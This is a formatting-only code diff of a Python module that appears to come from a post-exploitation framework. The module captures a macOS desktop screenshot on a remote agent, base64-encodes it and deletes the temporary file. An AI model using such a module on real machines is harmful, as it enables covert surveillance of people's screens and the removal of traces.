@@ -1,5 +1,3 @@
-from lib.common import helpers
-
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -16,16 +14,16 @@ class Module:
             'Description': ('Takes a screenshot of an OSX desktop using the Python Quartz libraries and returns the data.'),
 
             # True if the module needs to run in the background
-            'Background' : False,
+            'Background': False,
 
             # File extension to save the file as
-            'OutputExtension' : "png",
+            'OutputExtension': "png",
 
             # if the module needs administrative privileges
-            'NeedsAdmin' : False,
+            'NeedsAdmin': False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe' : False,
+            'OpsecSafe': False,
 
             # list of any references/other comments
             'Comments': []
@@ -35,13 +33,13 @@ class Module:
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Agent' : {
+            'Agent': {
                 # The 'Agent' option is the only one that MUST be in a module
                 'Description'   :   'Agent to execute module on.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'SavePath' : {
+            'SavePath': {
                 'Description'   :   'Path of the temporary screenshot file to save.',
                 'Required'      :   True,
                 'Value'         :   '/tmp/out.png'
@@ -62,7 +60,6 @@ class Module:
                 option, value = param
                 if option in self.options:
                     self.options[option]['Value'] = value
-
 
     def generate(self):
 
@@ -96,7 +93,7 @@ f = open(path, 'rb')
 data = base64.b64encode(f.read())
 f.close()
 run_command('rm -f %s')
-print data 
-""" %(savePath,savePath)
+print data
+""" % (savePath, savePath)
 
         return script
